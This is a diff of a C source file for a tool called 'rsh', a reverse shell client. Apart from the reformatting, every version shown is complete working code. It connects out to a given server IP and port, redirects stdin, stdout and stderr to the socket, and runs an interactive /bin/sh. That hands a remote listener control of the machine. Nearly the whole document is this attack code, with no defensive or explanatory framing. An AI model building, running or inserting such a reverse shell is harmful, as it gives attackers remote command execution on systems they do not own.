@@ -6,84 +6,95 @@
 #include <sys/socket.h>
 #include <unistd.h>
 
-static void usage(char *progname)
-{
-    const char *banner =
-        "          _       \n"
-        " _ __ ___| |__    \n"
-        "| '__/ __| '_ \\  \n"
-        "| |  \\__ \\ | | |\n"
-        "|_|  |___/_| |_|  \n"
-        "(r)everse(sh)ell\n";
+static void usage(char *progname) {
+  const char *banner =
+    "          _       \n"
+    " _ __ ___| |__    \n"
+    "| '__/ __| '_ \\  \n"
+    "| |  \\__ \\ | | |\n"
+    "|_|  |___/_| |_|  \n"
+    "(r)everse(sh)ell\n";
 
-    fprintf(stdout, "%s\nusage: %s -s <server_ip> -p <server_port>\n", banner, progname);
+  fprintf(stdout, "%s\nusage: %s -s <server_ip> -p <server_port>\n", banner,
+          progname);
 }
 
-static int parse_args(int argc, char *argv[], struct in_addr *addr, in_port_t *server_port)
-{
-    int opt;
+static int parse_args(int argc, char *argv[], struct in_addr *addr,
+                      in_port_t *server_port) {
+  int opt;
 
-    while ((opt = getopt(argc, argv, "p:s:h")) != -1) {
-        switch (opt) {
-        case 'p':
-            *server_port = htons(atoi(optarg));
-            break;
+  while ((opt = getopt(argc, argv, "p:s:h")) != -1) {
+    switch (opt) {
+    case 'p':
+      *server_port = htons(atoi(optarg));
+      break;
 
-        case 's':
-            inet_aton(optarg, addr);
-            break;
+    case 's':
+      inet_aton(optarg, addr);
+      break;
 
-        case 'h':
-            return 1;
-        }
+    case 'h':
+      return 1;
     }
+  }
 
-    if (!(*server_port) || !addr->s_addr)
-        return 1;
+  if (!(*server_port) || !addr->s_addr)
+    return 1;
 
-    return 0;
+  return 0;
 }
 
-static void exec_shell(int fd)
-{
-    char *const cmd[3] = { "/bin/sh", "-i", NULL };
+static void exec_shell(int fd) {
+  char *const cmd[3] = { "/bin/sh", "-i", NULL };
 
-    dup2(fd, STDIN_FILENO);
-    dup2(fd, STDOUT_FILENO);
-    dup2(fd, STDERR_FILENO);
+  dup2(fd, STDIN_FILENO);
+  dup2(fd, STDOUT_FILENO);
+  dup2(fd, STDERR_FILENO);
 
-    execv(cmd[0], cmd);
+  execv(cmd[0], cmd);
 }
 
-int main(int argc, char *argv[])
-{
-    struct sockaddr_in addr;
-    int fd = 0;
+static int run(struct sockaddr_in *addr) {
+  int fd;
 
-    memset(&addr, 0, sizeof(struct sockaddr_in));
+  addr->sin_family = AF_INET;
 
-    /* Parse the server ip and port. */
-    if (parse_args(argc, argv, &addr.sin_addr, &addr.sin_port)) {
-        usage(argv[0]);
-        exit(EXIT_FAILURE);
-    }
+  if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
+    fprintf(stderr, "[-] fail to create the communication socket!\n");
 
-    addr.sin_family = AF_INET;
+    return EXIT_FAILURE;
+  }
 
-    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
-        fprintf(stderr, "[-] fail to create the communication socket!\n");
-        exit(EXIT_FAILURE);
-    }
+  fprintf(stdout, "[+] trying to connect to server...\n");
 
-    fprintf(stdout, "[+] trying to connect to server...\n");
+  if (connect(fd, (struct sockaddr *)addr, sizeof(struct sockaddr))) {
+    fprintf(stderr, "[-] fail to connect to server!\n");
+    close(fd);
 
-    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr))) {
-        fprintf(stderr, "[-] fail to connect to server!\n");
-        close(fd);
-        exit(EXIT_FAILURE);
-    }
+    return EXIT_FAILURE;
+  }
 
-    fprintf(stdout, "[+] connection estabilished...\n");
+  fprintf(stdout, "[+] connection estabilished...\n");
 
-    exec_shell(fd);
+  exec_shell(fd);
+
+  return EXIT_SUCCESS;
+}
+
+int main(int argc, char *argv[]) {
+  struct sockaddr_in addr;
+  int ret;
+
+  memset(&addr, 0, sizeof(struct sockaddr_in));
+
+  // parse the server ip and port
+  if (parse_args(argc, argv, &addr.sin_addr, &addr.sin_port)) {
+    usage(argv[0]);
+    exit(EXIT_FAILURE);
+  }
+
+  // run the client
+  ret = run(&addr);
+
+  exit(ret);
 }
